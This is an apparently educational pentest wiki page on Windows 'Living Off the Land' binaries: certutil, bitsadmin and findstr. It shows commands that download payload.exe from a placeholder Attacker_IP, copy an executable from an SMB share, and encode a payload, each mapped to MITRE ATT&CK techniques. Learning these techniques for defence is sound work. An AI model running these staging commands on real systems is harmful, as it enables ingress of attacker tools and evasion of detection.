# File Operations

## Theory

Here, we will show commonly used tools used by "Living Off the Land" techniques about file operations including download, upload, and encoding. This techniques are covered by the [LOLBAS project](https://lolbas-project.github.io)

## Practice

{% tabs %}
{% tab title="Certutil.exe" %}
Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components. However, people found that certutil.exe could transfer and encode files unrelated to certification services.

```bash
#Dowload a file
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe

#Encode a file
certutil -encode payload.exe Encoded-payload.txt
```

The MITRE ATT\&CK framework identifies this techniques as [Ingress tool transfer (T1105)](https://attack.mitre.org/techniques/T1105/) and [Obfuscated Files or Information (T1027)](https://attack.mitre.org/techniques/T1027/)
{% endtab %}

{% tab title="BITSAdmin.exe" %}
The bitsadmin tool is a system administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress. [BITS](https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) is a low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers. Additional information about the bitsadmin tool can be found at [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin).

```bash
#Dowload a file
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\Pwned\Desktop\payload.exe
```

The MITRE ATT\&CK framework identifies this technique as [BITS Job (T1197)](https://attack.mitre.org/techniques/T1197/)
{% endtab %}

{% tab title="FindStr.exe" %}
[Findstr](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) is a Microsoft built-in tool used to find text and string patterns in files. The findstr tool is useful in that helps users and system administrators to search within files or parsed output. However, an unintended way was found by using findstr.exe to download remote files from SMB shared folders within the network as follows,

```bash
#Dowload a file
findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```

he MITRE ATT\&CK framework identifies this technique as [Ingress tool transfer (T1105)](https://attack.mitre.org/techniques/T1105/)
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Note that other tools can be used for file operations. We suggest visiting the [LOLBAS](https://lolbas-project.github.io/)[ ](https://lolbas-project.github.io/)project to check them out.
{% endhint %}

## References

{% embed url="https://tryhackme.com/room/livingofftheland" %}
{% embed url="https://lolbas-project.github.io/#" %}
